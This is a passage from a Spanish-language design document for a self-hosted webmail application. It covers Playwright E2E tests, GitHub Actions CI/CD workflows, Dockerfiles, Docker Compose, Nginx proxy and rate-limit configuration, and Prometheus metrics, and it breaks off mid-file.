    await page.fill('[data-testid="to-input"]', inbox.emailAddress);
    await page.fill('[data-testid="subject-input"]', 'E2E Test Subject');

    // Escribir en el editor Tiptap (contenteditable)
    const editor = page.locator('.ProseMirror');
    await editor.click();
    await editor.fill('Este es un email enviado desde Playwright E2E.');

    // Enviar
    await page.click('[data-testid="send-button"]');

    // Verificar mensaje de éxito
    await expect(page.locator('[data-testid="send-success"]')).toBeVisible();

    // Verificar que llegó al inbox (via MailSlurp API)
    const receivedEmail = await waitForEmail(inbox.id, { subjectContains: 'E2E Test Subject' });
    expect(receivedEmail).toBeDefined();
    expect(receivedEmail.subject).toBe('E2E Test Subject');
  });

  test('auto-save de borrador cada 10 segundos', async ({ page }) => {
    await page.goto('/compose');

    await page.fill('[data-testid="to-input"]', 'draft@example.com');
    await page.fill('[data-testid="subject-input"]', 'Draft Auto-Save');

    const editor = page.locator('.ProseMirror');
    await editor.click();
    await editor.fill('Contenido del borrador...');

    // Esperar auto-save (10 segundos)
    await page.waitForTimeout(11000);

    await expect(page.locator('[data-testid="last-saved"]')).toContainText('Guardado');

    // Recargar y verificar que se restauró
    await page.reload();
    await expect(page.locator('[data-testid="subject-input"]')).toHaveValue('Draft Auto-Save');
  });

  test('reply cita el email original', async ({ page }) => {
    // Seed: crear un email de prueba vía API
    await page.goto('/inbox');
    await page.waitForSelector('[data-testid="email-list-item"]');

    // Seleccionar primer email
    await page.click('[data-testid="email-list-item"]:first-child');

    // Click en responder
    await page.click('[data-testid="reply-button"]');

    await expect(page).toHaveURL(/\/compose\?replyTo=/);

    // Verificar que el asunto tiene "Re:"
    const subject = await page.inputValue('[data-testid="subject-input"]');
    expect(subject).toMatch(/^Re: /);

    // Verificar que el editor contiene la cita
    const editorHtml = await page.locator('.ProseMirror').innerHTML();
    expect(editorHtml).toContain('blockquote');
  });
});
```

### 12.3.2 MailSlurp para Email Real en E2E

MailSlurp proporciona inboxes desechables programáticos con SMTP y API REST, ideal para testing de flujos de correo en CI/CD [^324^].

```typescript
// packages/web/e2e/helpers/mailslurp.ts
import { MailSlurp } from 'mailslurp-client';

const mailslurp = new MailSlurp({ apiKey: process.env.MAILSLURP_API_KEY! });

export async function createInbox() {
  return mailslurp.createInbox();
}

export async function waitForEmail(
  inboxId: string,
  options: { subjectContains?: string; timeout?: number } = {}
) {
  const { subjectContains, timeout = 60000 } = options;

  const emails = await mailslurp.waitForLatestEmail(inboxId, timeout);

  if (subjectContains && !emails.subject?.includes(subjectContains)) {
    throw new Error(`Subject mismatch: expected "${subjectContains}", got "${emails.subject}"`);
  }

  return emails;
}

export async function deleteInbox(inboxId: string) {
  await mailslurp.deleteInbox(inboxId);
}
```

### 12.3.3 Calendario: Sync CalDAV E2E

```typescript
// packages/web/e2e/calendar.spec.ts
import { test, expect } from '@playwright/test';

test.describe('Calendario E2E', () => {
  test('navegación entre vistas día/semana/mes', async ({ page }) => {
    await page.goto('/calendar');

    // Verificar vista semanal por defecto
    await expect(page.locator('.fc-timeGridWeek-view')).toBeVisible();

    // Cambiar a vista mensual
    await page.click('text=Mes');
    await expect(page.locator('.fc-dayGridMonth-view')).toBeVisible();

    // Cambiar a vista diaria
    await page.click('text=Día');
    await expect(page.locator('.fc-timeGridDay-view')).toBeVisible();
  });

  test('crear evento y visualizarlo', async ({ page }) => {
    await page.goto('/calendar');

    // Click en slot horario
    await page.click('.fc-time-grid .fc-slats tr[data-time="10:00:00"]');

    // Llenar formulario
    await page.fill('[data-testid="event-title"]', 'Reunión E2E');
    await page.fill('[data-testid="event-location"]', 'Sala Virtual');
    await page.click('[data-testid="event-save"]');

    // Verificar que aparece en el calendario
    await expect(page.locator('text=Reunión E2E')).toBeVisible();
  });
});
```

## 12.4 Cobertura y CI

### 12.4.1 Thresholds de Cobertura

| Métrica | Threshold | Justificación |
|---------|-----------|---------------|
| Líneas | 85% | Cobertura completa de lógica de negocio |
| Funciones | 85% | Todas las funciones públicas testeadas |
| Ramas | 80% | Casos de error y paths alternativos |
| Statements | 85% | Sentencias ejecutables |

### 12.4.2 Pirámide de Testing: 70/20/10

| Nivel | Proporción | Framework | Ejemplos |
|-------|------------|-----------|----------|
| Unitario | 70% | Vitest | Composables, servicios, sanitización, utilidades |
| Integración | 20% | Vitest + Testcontainers | API endpoints, DB queries, auth flows |
| E2E | 10% | Playwright | Login→compose→send, calendario, drag-drop |

### 12.4.3 Reporte de Cobertura en PRs

La acción `davelosert/vitest-coverage-report-action@v2` publica reportes de cobertura como comentarios en pull requests, con comparación contra la rama base [^216^] [^272^].

```yaml
# Fragmento del workflow CI (completo en capítulo 13)
- name: Run tests with coverage
  run: pnpm -r test:unit --coverage

- name: Upload coverage report
  uses: actions/upload-artifact@v4
  with:
    name: coverage-report
    path: '**/coverage/*.json'

- name: Post coverage comment
  uses: davelosert/vitest-coverage-report-action@v2
  with:
    json-summary-path: ./packages/api/coverage/coverage-summary.json
    json-final-path: ./packages/api/coverage/coverage-final.json
    file-coverage-mode: changes
    reportOnFailure: true
```

**Comandos de ejecución local:**

```bash
# Tests unitarios con watch mode
pnpm test:unit

# Tests unitarios con cobertura
pnpm test:unit --coverage

# Tests de integración
pnpm test:integration

# Tests E2E
pnpm test:e2e

# Todos los tests (CI)
pnpm test
```

**Criterios de aceptación del capítulo de testing:**
- Suite unitaria completa con >85% cobertura
- Tests de integración para todos los endpoints de la API
- Tests E2E para flujos críticos (login, compose, envío, lectura)
- Suite de regresión XSS con 10+ payloads conocidos
- Reporte de cobertura automático en cada PR


---

# 13. CI/CD y DevOps

La infraestructura de integración continua y despliegue continuo de Webmail 6.0 está diseñada para operar directamente sobre Docker Compose, que — con health checks, restart policies y resource limits apropiados — es una solución productiva para despliegues self-hosted de pequeña y mediana escala [^192^] [^190^]. Kubernetes se contempla como migración futura para escenarios enterprise.

## 13.1 GitHub Actions Pipeline

GitHub Actions es la plataforma de CI/CD por defecto para proyectos alojados en GitHub en 2026, ofreciendo configuración zero-config con workflows YAML en `.github/workflows/` [^140^] [^152^]. El pipeline se divide en tres workflows independientes.

### 13.1.1 CI: Install → Lint → Unit → Integration → Build → Coverage

```yaml
# .github/workflows/ci.yml
name: CI

on:
  push:
    branches: [main, develop]
    paths:
      - 'packages/**'
      - '.github/workflows/**'
      - 'docker-compose*.yml'
      - 'package.json'
      - 'pnpm-workspace.yaml'
  pull_request:
    branches: [main, develop]
    paths:
      - 'packages/**'
      - '.github/workflows/**'
      - 'package.json'
      - 'pnpm-workspace.yaml'

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

jobs:
  changes:
    runs-on: ubuntu-24.04
    timeout-minutes: 5
    outputs:
      api: ${{ steps.filter.outputs.api }}
      web: ${{ steps.filter.outputs.web }}
      shared: ${{ steps.filter.outputs.shared }}
    steps:
      - uses: actions/checkout@v4
      - uses: dorny/paths-filter@v3
        id: filter
        with:
          filters: |
            api: ['packages/api/**', 'packages/shared/**']
            web: ['packages/web/**', 'packages/shared/**']
            shared: ['packages/shared/**']

  lint:
    runs-on: ubuntu-24.04
    timeout-minutes: 10
    needs: changes
    if: ${{ needs.changes.outputs.api == 'true' || needs.changes.outputs.web == 'true' }}
    steps:
      - uses: actions/checkout@v4
      - uses: pnpm/action-setup@v4
        with:
          version: 9.15.0
          run_install: false
      - uses: actions/setup-node@v4
        with:
          node-version: '22'
          cache: 'pnpm'
      - run: pnpm install --frozen-lockfile
      - run: pnpm lint
      - run: pnpm typecheck

  unit-test:
    runs-on: ubuntu-24.04
    timeout-minutes: 15
    needs: [changes, lint]
    if: ${{ needs.changes.outputs.api == 'true' || needs.changes.outputs.web == 'true' || needs.changes.outputs.shared == 'true' }}
    strategy:
      fail-fast: false
      matrix:
        package: [api, web, shared]
    steps:
      - uses: actions/checkout@v4
      - uses: pnpm/action-setup@v4
        with:
          version: 9.15.0
          run_install: false
      - uses: actions/setup-node@v4
        with:
          node-version: '22'
          cache: 'pnpm'
      - run: pnpm install --frozen-lockfile

      - name: Run unit tests with coverage
        run: |
          cd packages/${{ matrix.package }}
          pnpm vitest run --coverage --reporter=json --reporter=text --outputFile=coverage-report.json

      - name: Upload coverage artifact
        uses: actions/upload-artifact@v4
        with:
          name: coverage-${{ matrix.package }}
          path: packages/${{ matrix.package }}/coverage/
          retention-days: 7

  integration-test:
    runs-on: ubuntu-24.04
    timeout-minutes: 20
    needs: [changes, lint]
    if: ${{ needs.changes.outputs.api == 'true' || needs.changes.outputs.shared == 'true' }}
    services:
      mongo:
        image: mongo:7.0.16
        ports: ['27017:27017']
        env:
          MONGO_INITDB_ROOT_USERNAME: test
          MONGO_INITDB_ROOT_PASSWORD: testpass
        options: >-
          --health-cmd "mongosh --eval 'db.adminCommand(\"ping\")'"
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
      redis:
        image: redis:7.4-alpine
        ports: ['6379:6379']
        options: >-
          --health-cmd "redis-cli ping"
          --health-interval 10s
          --health-timeout 3s
          --health-retries 5
    steps:
      - uses: actions/checkout@v4
      - uses: pnpm/action-setup@v4
        with:
          version: 9.15.0
          run_install: false
      - uses: actions/setup-node@v4
        with:
          node-version: '22'
          cache: 'pnpm'
      - run: pnpm install --frozen-lockfile

      - name: Run integration tests
        run: cd packages/api && pnpm vitest run --config vitest.integration.config.ts
        env:
          MONGODB_URI: mongodb://test:testpass@localhost:27017/test?authSource=admin
          REDIS_URL: redis://localhost:6379
          JWT_SECRET: ci-test-secret-32-bytes-long!!!
          ENCRYPTION_KEY: aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899
          NODE_ENV: test

  build:
    runs-on: ubuntu-24.04
    timeout-minutes: 15
    needs: [unit-test, integration-test]
    if: always() && (needs.unit-test.result == 'success') && (needs.integration-test.result == 'success' || needs.integration-test.result == 'skipped')
    steps:
      - uses: actions/checkout@v4
      - uses: pnpm/action-setup@v4
        with:
          version: 9.15.0
          run_install: false
      - uses: actions/setup-node@v4
        with:
          node-version: '22'
          cache: 'pnpm'
      - run: pnpm install --frozen-lockfile
      - run: pnpm -r build

      - name: Upload build artifacts
        uses: actions/upload-artifact@v4
        with:
          name: build-output
          path: |
            packages/api/dist/
            packages/web/dist/
            packages/shared/dist/
          retention-days: 7

  coverage-report:
    runs-on: ubuntu-24.04
    timeout-minutes: 5
    needs: unit-test
    if: github.event_name == 'pull_request'
    permissions:
      contents: read
      pull-requests: write
    steps:
      - uses: actions/checkout@v4
      - uses: actions/download-artifact@v4
        with:
          pattern: coverage-*
          merge-multiple: true

      - name: Post coverage comment to PR
        uses: davelosert/vitest-coverage-report-action@v2
        with:
          json-summary-path: ./coverage/coverage-summary.json
          file-coverage-mode: changes
          reportOnFailure: true
```

### 13.1.2 E2E: Build → Docker Compose → Playwright

```yaml
# .github/workflows/e2e.yml
name: E2E Tests

on:
  push:
    branches: [main, develop]
    paths:
      - 'packages/**'
      - 'docker-compose*.yml'
      - 'Dockerfile*'
  pull_request:
    branches: [main]
    paths:
      - 'packages/**'
      - 'docker-compose*.yml'
      - 'Dockerfile*'

concurrency:
  group: e2e-${{ github.ref }}
  cancel-in-progress: true

jobs:
  e2e:
    runs-on: ubuntu-24.04
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v4

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3

      - name: Build and start services
        run: |
          docker compose -f docker-compose.yml -f docker-compose.test.yml up -d --build

      - name: Wait for services healthy
        run: |
          for i in {1..30}; do
            if docker compose ps | grep -q "unhealthy"; then
              echo "Waiting for services..."
              sleep 5
            else
              echo "All services healthy"
              break
            fi
          done

      - name: Seed test data
        run: |
          docker compose exec -T api node /app/scripts/seed-e2e.js

      - name: Run Playwright tests
        run: |
          cd packages/web
          npx playwright install --with-deps chromium
          npx playwright test --project=chromium
        env:
          BASE_URL: http://localhost:8080
          MAILSLURP_API_KEY: ${{ secrets.MAILSLURP_API_KEY }}

      - name: Upload Playwright report
        uses: actions/upload-artifact@v4
        if: always()
        with:
          name: playwright-report
          path: packages/web/playwright-report/
          retention-days: 7

      - name: Upload test screenshots
        uses: actions/upload-artifact@v4
        if: failure()
        with:
          name: playwright-screenshots
          path: packages/web/test-results/
          retention-days: 7

      - name: Tear down
        if: always()
        run: docker compose down -v --remove-orphans
```

### 13.1.3 CD: Build Docker → Push Registry → Deploy

```yaml
# .github/workflows/cd.yml
name: CD - Deploy to Production

on:
  push:
    tags: ['v*']
  workflow_dispatch:
    inputs:
      environment:
        description: 'Entorno de despliegue'
        required: true
        default: 'staging'
        type: choice
        options: [staging, production]

env:
  REGISTRY: ghcr.io
  IMAGE_NAME: ${{ github.repository }}

jobs:
  build-and-push:
    runs-on: ubuntu-24.04
    timeout-minutes: 30
    permissions:
      contents: read
      packages: write
    strategy:
      matrix:
        service: [api, web]
    steps:
      - uses: actions/checkout@v4

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3

      - name: Log in to GitHub Container Registry
        uses: docker/login-action@v3
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Extract metadata
        id: meta
        uses: docker/metadata-action@v5
        with:
          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}/${{ matrix.service }}
          tags: |
            type=semver,pattern={{version}}
            type=semver,pattern={{major}}.{{minor}}
            type=sha,prefix={{branch}}-
            type=raw,value=latest,enable={{is_default_branch}}

      - name: Build and push
        uses: docker/build-push-action@v6
        with:
          context: .
          file: packages/${{ matrix.service }}/Dockerfile
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          cache-from: type=gha
          cache-to: type=gha,mode=max
          platforms: linux/amd64,linux/arm64

  deploy-staging:
    runs-on: ubuntu-24.04
    needs: build-and-push
    if: github.event.inputs.environment == 'staging' || startsWith(github.ref, 'refs/tags/v')
    environment:
      name: staging
      url: https://staging.webmail6.local
    steps:
      - uses: actions/checkout@v4

      - name: Deploy to staging server
        uses: appleboy/ssh-action@v1.0.3
        with:
          host: ${{ secrets.STAGING_HOST }}
          username: ${{ secrets.STAGING_USER }}
          key: ${{ secrets.STAGING_SSH_KEY }}
          script: |
            cd /opt/webmail6
            docker compose pull
            docker compose up -d --remove-orphans
            docker system prune -f

  deploy-production:
    runs-on: ubuntu-24.04
    needs: [build-and-push, deploy-staging]
    if: github.event.inputs.environment == 'production'
    environment:
      name: production
      url: https://webmail6.local
    steps:
      - name: Deploy to production
        uses: appleboy/ssh-action@v1.0.3
        with:
          host: ${{ secrets.PROD_HOST }}
          username: ${{ secrets.PROD_USER }}
          key: ${{ secrets.PROD_SSH_KEY }}
          script: |
            cd /opt/webmail6
            docker compose -f docker-compose.yml -f docker-compose.prod.yml pull
            docker compose -f docker-compose.yml -f docker-compose.prod.yml up -d --remove-orphans
            docker system prune -f
```

## 13.2 Docker Configuration

### 13.2.1 Multi-stage Dockerfile Frontend

El frontend sigue el patrón estándar: build con Node.js, servir con Nginx Alpine. Esta aproximación reduce drásticamente el tamaño de la imagen final al eliminar herramientas de build [^212^] [^219^].

```dockerfile
# packages/web/Dockerfile
# ────────────────────────────────
# Stage 1: Build
# ────────────────────────────────
FROM node:22-alpine AS builder
WORKDIR /app

# Instalar pnpm
RUN corepack enable && corepack prepare pnpm@9.15.0 --activate

# Copiar archivos de workspace
COPY package.json pnpm-workspace.yaml tsconfig.base.json ./
COPY packages/shared/package.json packages/shared/tsconfig.json ./packages/shared/
COPY packages/web/package.json packages/web/tsconfig.json packages/web/vite.config.ts packages/web/tailwind.config.js packages/web/postcss.config.js ./packages/web/

# Instalar dependencias
RUN pnpm install --frozen-lockfile

# Copiar código fuente
COPY packages/shared/src ./packages/shared/src
COPY packages/web/src ./packages/web/src
COPY packages/web/index.html ./packages/web/

# Build de shared primero
RUN pnpm --filter @webmail6/shared build

# Build del frontend (Vite)
ARG VITE_API_URL=/api
ENV VITE_API_URL=${VITE_API_URL}
RUN pnpm --filter @webmail6/web build

# ────────────────────────────────
# Stage 2: Serve con Nginx
# ────────────────────────────────
FROM nginx:1.27-alpine AS production

# Eliminar configuración por defecto
RUN rm -f /etc/nginx/conf.d/default.conf

# Configuración de Nginx para SPA
COPY packages/web/nginx.conf /etc/nginx/conf.d/webmail.conf

# Archivos estáticos del build
COPY --from=builder /app/packages/web/dist /usr/share/nginx/html

# Health check
HEALTHCHECK --interval=15s --timeout=5s --start-period=5s --retries=3 \
  CMD wget -q --spider http://localhost:80/health || exit 1

EXPOSE 80

# Non-root user
USER nginx

CMD ["nginx", "-g", "daemon off;"]
```

### 13.2.2 Multi-stage Dockerfile Backend

```dockerfile
# packages/api/Dockerfile
# ────────────────────────────────
# Stage 1: Dependencies
# ────────────────────────────────
FROM node:22-alpine AS deps
WORKDIR /app

RUN corepack enable && corepack prepare pnpm@9.15.0 --activate

COPY package.json pnpm-workspace.yaml tsconfig.base.json ./
COPY packages/shared/package.json packages/shared/tsconfig.json ./packages/shared/
COPY packages/api/package.json packages/api/tsconfig.json ./packages/api/

RUN pnpm install --frozen-lockfile --prod

# ────────────────────────────────
# Stage 2: Builder
# ────────────────────────────────
FROM node:22-alpine AS builder
WORKDIR /app

RUN corepack enable && corepack prepare pnpm@9.15.0 --activate

COPY package.json pnpm-workspace.yaml tsconfig.base.json ./
COPY packages/shared/package.json packages/shared/tsconfig.json ./packages/shared/
COPY packages/api/package.json packages/api/tsconfig.json ./packages/api/

RUN pnpm install --frozen-lockfile

COPY packages/shared/src ./packages/shared/src
COPY packages/api/src ./packages/api/src

RUN pnpm --filter @webmail6/shared build
RUN pnpm --filter @webmail6/api build

# ────────────────────────────────
# Stage 3: Production
# ────────────────────────────────
FROM node:22-slim AS production
WORKDIR /app

# Security hardening
RUN apt-get update && apt-get install -y --no-install-recommends wget ca-certificates \
  && rm -rf /var/lib/apt/lists/* \
  && groupadd -r webmail && useradd -r -g webmail webmail

# Copiar solo lo necesario
COPY --from=deps /app/node_modules ./node_modules
COPY --from=deps /app/packages/shared/node_modules ./packages/shared/node_modules
COPY --from=deps /app/packages/api/node_modules ./packages/api/node_modules
COPY --from=builder /app/packages/shared/dist ./packages/shared/dist
COPY --from=builder /app/packages/shared/package.json ./packages/shared/
COPY --from=builder /app/packages/api/dist ./packages/api/dist
COPY --from=builder /app/packages/api/package.json ./packages/api/
COPY package.json pnpm-workspace.yaml ./

# Scripts de seed y migración
COPY packages/api/scripts ./packages/api/scripts

# Health check
HEALTHCHECK --interval=15s --timeout=5s --start-period=30s --retries=3 \
  CMD wget -q --spider http://localhost:3000/health/live || exit 1

EXPOSE 3000

USER webmail

CMD ["node", "packages/api/dist/index.js"]
```

### 13.2.3 Docker Compose Dev vs Prod

```yaml
# docker-compose.override.yml (desarrollo local)
services:
  api:
    build:
      target: builder
    command: pnpm --filter @webmail6/api dev
    environment:
      NODE_ENV: development
      LOG_LEVEL: debug
      MONGODB_URI: mongodb://admin:devpass@mongo:27017/webmail6?authSource=admin
      REDIS_URL: redis://redis:6379
      JWT_SECRET: dev-jwt-secret-change-in-production
      ENCRYPTION_KEY: 0000000000000000000000000000000000000000000000000000000000000000
      SEAWEEDFS_ENDPOINT: http://seaweedfs:8333
      FRONTEND_URL: http://localhost:5173
    ports:
      - "3000:3000"
    volumes:
      - ./packages/api/src:/app/packages/api/src:ro
      - ./packages/shared/src:/app/packages/shared/src:ro

  web:
    build:
      context: .
      dockerfile: packages/web/Dockerfile
      target: builder
    command: pnpm --filter @webmail6/web dev --host
    environment:
      NODE_ENV: development
    ports:
      - "5173:5173"
    volumes:
      - ./packages/web/src:/app/packages/web/src:ro
      - ./packages/shared/src:/app/packages/shared/src:ro

  nginx:
    profiles: [prod]  # No levantar nginx en dev
```

```yaml
# docker-compose.prod.yml (producción)
services:
  api:
    restart: unless-stopped
    deploy:
      replicas: 2
      resources:
        limits: { cpus: '1.0', memory: 512M }
        reservations: { cpus: '0.25', memory: 128M }
    logging:
      driver: json-file
      options: { max-size: "10m", max-file: "5" }

  web:
    restart: unless-stopped
    deploy:
      resources:
        limits: { cpus: '0.5', memory: 64M }
    logging:
      driver: json-file
      options: { max-size: "10m", max-file: "3" }

  nginx:
    restart: unless-stopped
    ports:
      - "80:80"
      - "443:443"
    deploy:
      resources:
        limits: { cpus: '0.25', memory: 128M }

  mongo:
    restart: unless-stopped
    deploy:
      resources:
        limits: { cpus: '2.0', memory: 2G }
        reservations: { memory: 512M }

  redis:
    restart: unless-stopped
    deploy:
      resources:
        limits: { cpus: '0.5', memory: 512M }

  seaweedfs:
    restart: unless-stopped
    deploy:
      resources:
        limits: { cpus: '1.0', memory: 2G }

  # Prometheus para métricas
  prometheus:
    image: prom/prometheus:v3.0.1
    container_name: webmail6_prometheus
    restart: unless-stopped
    volumes:
      - ./monitoring/prometheus.yml:/etc/prometheus/prometheus.yml:ro
      - prometheus_data:/prometheus
    ports:
      - "9090:9090"
    command:
      - '--config.file=/etc/prometheus/prometheus.yml'
      - '--storage.tsdb.path=/prometheus'
      - '--storage.tsdb.retention.time=15d'
    networks:
      - webmail6_net

  # Grafana para visualización
  grafana:
    image: grafana/grafana:11.4.0
    container_name: webmail6_grafana
    restart: unless-stopped
    volumes:
      - grafana_data:/var/lib/grafana
      - ./monitoring/grafana-dashboards:/etc/grafana/provisioning/dashboards:ro
      - ./monitoring/grafana-datasources.yml:/etc/grafana/provisioning/datasources/datasources.yml:ro
    ports:
      - "3001:3000"
    environment:
      GF_SECURITY_ADMIN_PASSWORD__FILE: /run/secrets/grafana_admin_password
    secrets:
      - grafana_admin_password
    networks:
      - webmail6_net

  # Node Exporter para métricas del host
  node-exporter:
    image: prom/node-exporter:v1.8.2
    container_name: webmail6_node_exporter
    restart: unless-stopped
    volumes:
      - /proc:/host/proc:ro
      - /sys:/host/sys:ro
      - /:/rootfs:ro
    command:
      - '--path.procfs=/host/proc'
      - '--path.rootfs=/rootfs'
      - '--path.sysfs=/host/sys'
      - '--collector.filesystem.mount-points-exclude=^/(sys|proc|dev|host|etc)($$|/)'
    networks:
      - webmail6_net

volumes:
  prometheus_data:
  grafana_data:

secrets:
  grafana_admin_password:
    environment: GRAFANA_ADMIN_PASSWORD
```

```yaml
# docker-compose.test.yml (E2E testing)
services:
  api:
    build:
      dockerfile: packages/api/Dockerfile
      target: production
    environment:
      NODE_ENV: test
      MONGODB_URI: mongodb://admin:testpass@mongo:27017/webmail6_test?authSource=admin
      JWT_SECRET: test-jwt-secret-32-bytes-long!!!
      ENCRYPTION_KEY: 0000000000000000000000000000000000000000000000000000000000000000

  mongo:
    environment:
      MONGO_INITDB_ROOT_USERNAME: admin
      MONGO_INITDB_ROOT_PASSWORD: testpass

  # MailSlurp mock server para E2E
  mailslurp-mock:
    image: mailslurp/mailslurp:latest
    container_name: webmail6_mailslurp
    ports:
      - "1080:1080"
      - "2587:2587"
      - "2045:2045"
      - "4025:4025"
      - "1143:1143"
      - "3002:3002"
    networks:
      - webmail6_net
    profiles: [e2e]
```

## 13.3 Nginx Configuration

### 13.3.1 Reverse Proxy: /api → Fastify, /ws → Socket.IO, SPA Fallback

Nginx actúa como reverse proxy, terminador SSL y punto único de entrada. Su arquitectura event-driven soporta 10,000+ conexiones simultáneas con ~2.5MB de memoria por 10k conexiones inactivas [^149^].

```nginx
# nginx/conf.d/webmail.conf
upstream api_backend {
    server api:3000;
    keepalive 32;
}

upstream ws_backend {
    server api:3001;
    keepalive 32;
}

# Rate limiting zones
limit_req_zone $binary_remote_addr zone=login:10m rate=1r/s;
limit_req_zone $binary_remote_addr zone=api:10m rate=30r/s;
limit_req_zone $binary_remote_addr zone=general:10m rate=10r/s;
limit_conn_zone $binary_remote_addr zone=addr:10m;

# Map para WebSocket upgrade
map $http_upgrade $connection_upgrade {
    default upgrade;
    ''      close;
}

server {
    listen 80;
    server_name _;

    # Redirect HTTP to HTTPS in production
    location / {
        return 301 https://$host$request_uri;
    }
}

server {
    listen 443 ssl http2;
    server_name webmail6.local;

    # SSL certificates (Let's Encrypt or self-signed)
    ssl_certificate /etc/letsencrypt/live/webmail6.local/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/webmail6.local/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
    ssl_prefer_server_ciphers off;

    # Security headers
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https:; connect-src 'self' wss: https:; font-src 'self';" always;

    # Rate limiting general
    limit_req zone=general burst=20 nodelay;
    limit_conn addr 20;

    # API proxy (Fastify)
    location /api/ {
        limit_req zone=api burst=50 delay=30;
        limit_req_status 429;

        proxy_pass http://api_backend/;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_connect_timeout 30s;
        proxy_send_timeout 30s;
        proxy_read_timeout 30s;
    }

    # Login endpoint (rate limit estricto)
    location /api/v1/auth/login {
        limit_req zone=login burst=3 nodelay;
        limit_req_status 429;

        proxy_pass http://api_backend/api/v1/auth/login;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }

    # WebSocket proxy (Socket.IO)
    location /ws/ {
        proxy_pass http://ws_backend/;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection $connection_upgrade;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_read_timeout 86400s;
        proxy_send_timeout 86400s;
    }

    # Métricas Prometheus (protegidas, solo red interna)
    location /metrics {
        allow 10.0.0.0/8;
        allow 172.16.0.0/12;
        allow 127.0.0.1;
        deny all;

        proxy_pass http://api_backend/metrics;
        proxy_http_version 1.1;
    }

    # Static files (SPA)
    location / {
        root /usr/share/nginx/html;
        try_files $uri $uri/ /index.html;

        # Cache static assets
        location ~* \.(js|css|png|jpg|jpeg|gif|ico|svg|woff|woff2|ttf|eot)$ {
            expires 1y;
            add_header Cache-Control "public, immutable";
        }
    }

    # Error pages
    error_page 429 @rate_limit;
    location @rate_limit {
        return 429 '{"error":"Rate limit exceeded","retryAfter":"60"}';
        add_header Content-Type application/json;
    }
}
```

### 13.3.2 Rate Limiting Configuración

| Endpoint | Zone | Rate | Burst | Propósito |
|----------|------|------|-------|-----------|
| `/api/v1/auth/login` | login | 1 r/s | 3 | Protección contra fuerza bruta |
| `/api/v1/auth/*` | general | 10 r/s | 20 | Autenticación general |
| `/api/v1/emails/*` | api | 30 r/s | 50 | Operaciones de email |
| `/ws/*` | - | - | - | WebSocket sin rate limit |
| `/` (SPA) | general | 10 r/s | 20 | Assets estáticos |

La configuración retorna HTTP 429 para rate limits excedidos, con cabecera `Retry-After` [^167^].

### 13.3.3 SSL Let's Encrypt

```bash
# Certbot para Let's Encrypt (primera vez)
docker run -it --rm \
  -v certbot_data:/etc/letsencrypt \
  -v /var/www/certbot:/var/www/certbot \
  certbot/certbot certonly \
  --standalone \
  -d webmail6.local \
  --agree-tos \
  --email admin@webmail6.local \
  --non-interactive

# Renovación automática (cron cada 12 horas)
# En docker-compose.prod.yml añadir:
  certbot:
    image: certbot/certbot:v3.0.1
    container_name: webmail6_certbot
    volumes:
      - certbot_data:/etc/letsencrypt
      - /var/www/certbot:/var/www/certbot
    entrypoint: "/bin/sh -c 'trap exit TERM; while :; do certbot renew; sleep 12h; done'"
    networks:
      - webmail6_net
```

## 13.4 Monitoreo

### 13.4.1 prom-client y Métricas Custom

`prom-client` es el cliente oficial de Prometheus para Node.js. Incluye métricas por defecto (CPU, memoria, GC, event loop lag) y permite definir métricas custom para el dominio de email [^155^] [^163^].

```typescript
// packages/api/src/config/metrics.ts
import client from 'prom-client';

// Métricas por defecto (heap, CPU, event loop)
client.collectDefaultMetrics({
  register: client.register,
  prefix: 'webmail6_',
  gcDurationBuckets: [0.001, 0.01, 0.1, 1, 2, 5],
});

// Histograma de latencia HTTP
export const httpDuration = new client.Histogram({
  name: 'webmail6_http_request_duration_seconds',
  help: 'Duración de requests HTTP en segundos',
  labelNames: ['method', 'route', 'status_code'],
  buckets: [0.01, 0.05, 0.1, 0.5, 1, 2, 5, 10],
  registers: [client.register],
});

// Contador de requests
export const httpRequests = new client.Counter({
  name: 'webmail6_http_requests_total',
  help: 'Total de requests HTTP',
  labelNames: ['method', 'route', 'status_code'],
  registers: [client.register],
});

// Gauge de conexiones WebSocket activas
export const wsConnections = new client.Gauge({
  name: 'webmail6_websocket_connections_active',
  help: 'Conexiones WebSocket activas',
  labelNames: ['user'],
  registers: [client.register],
});

// Gauge de cuentas IMAP conectadas
export const imapConnections = new client.Gauge({
  name: 'webmail6_imap_connections_active',
  help: 'Conexiones IMAP activas por cuenta',
  labelNames: ['account_id'],
  registers: [client.register],
});

// Contador de emails enviados
export const emailsSent = new client.Counter({
  name: 'webmail6_emails_sent_total',
  help: 'Total de emails enviados',
  labelNames: ['account_id', 'status'],
  registers: [client.register],
});

// Contador de emails sincronizados
export const emailsSynced = new client.Counter({
  name: 'webmail6_emails_synced_total',
  help: 'Emails sincronizados desde IMAP',
  labelNames: ['account_id', 'folder'],
